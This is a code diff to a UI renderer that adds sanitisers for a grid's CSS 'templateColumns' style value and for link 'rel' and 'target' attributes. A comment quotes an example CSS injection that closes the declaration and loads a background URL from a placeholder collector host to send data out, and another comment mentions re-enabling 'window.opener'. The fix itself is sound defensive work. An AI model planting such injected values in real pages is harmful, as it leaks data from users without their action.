@@ -30,7 +30,11 @@ import {
   sanitizeEmbedSrcForEgress,
   sanitizeUrlForEgress,
 } from '@fuaran-ui/renderer/egress';
-import { sanitizeExtraAttributes } from '@fuaran-ui/renderer/sanitize';
+import {
+  sanitizeCssValueForSlot,
+  sanitizeExtraAttributes,
+  sanitizeLinkAnchor,
+} from '@fuaran-ui/renderer/sanitize';
 import type {
   Action,
   Binding,
@@ -519,8 +523,22 @@ const renderLayout = (
       }
       if (spec.layout.kind === 'Grid') {
         const g = spec.layout;
-        const templateColumns =
+        const declaredTemplateColumns =
           g.templateColumns !== undefined ? g.templateColumns : `repeat(${g.cols}, 1fr)`;
+        // `templateColumns` is a free string on the wire that lands verbatim in
+        // a `style` attribute — the one slot in this renderer where a decoded
+        // document writes CSS. Unsanitised, a value carrying
+        // `;background:url(https://collector/?d=…)` closed the declaration,
+        // opened a second one, and fetched on RENDER with no user act, outside
+        // the egress policy that governs every href and src in the same
+        // document, while the React client dropped the identical value
+        // silently. The rule is the shared emission grammar, so every host now
+        // emits the same bytes for the same tree, and a refusal is MARKED on
+        // the element rather than being silent.
+        const [templateColumns, cssRefusalAttrs] = sanitizeCssValueForSlot(
+          'grid-template-columns',
+          declaredTemplateColumns,
+        );
         // `gap` (Phase 459) emits only when set — gap-free grids stay
         // byte-identical to the pre-459 emission (SSR parity with the client).
         const gridStyle =
@@ -532,6 +550,7 @@ const renderLayout = (
           [
             ['class', `fuaran-layout-grid${brk}`],
             ['style', gridStyle],
+            ...(cssRefusalAttrs as Attr[]),
           ],
           renderChildren(ctx, spec.children),
         );
@@ -1044,8 +1063,19 @@ const renderDisplay = (
         ['class', 'fuaran-link'],
         ['href', href],
       ];
-      if (display.spec.rel !== undefined) attrs.push(['rel', display.spec.rel]);
-      if (display.spec.target !== undefined) attrs.push(['target', display.spec.target]);
+      // `rel` and `target` were emitted VERBATIM, so a decoded tree could write
+      // `rel="opener"` on a `_blank` link and re-enable `window.opener`, or name
+      // an arbitrary browsing context in `target`. Both are closed token sets
+      // now, resolved TOGETHER because the `rel` rule depends on the sanitised
+      // target: `noopener noreferrer` is FORCED on `_blank` whether or not the
+      // document asked. Same grammar, same order, same bytes as every other
+      // host.
+      const [safeTarget, safeRel] = sanitizeLinkAnchor(
+        display.spec.target,
+        display.spec.rel,
+      );
+      if (safeRel !== undefined) attrs.push(['rel', safeRel]);
+      if (safeTarget !== undefined) attrs.push(['target', safeTarget]);
       if (display.spec.download) attrs.push(['download', true]);
       // Phase 951 — the node's a11y projection lands on the anchor.
       attrs.push(...semanticAttrs);
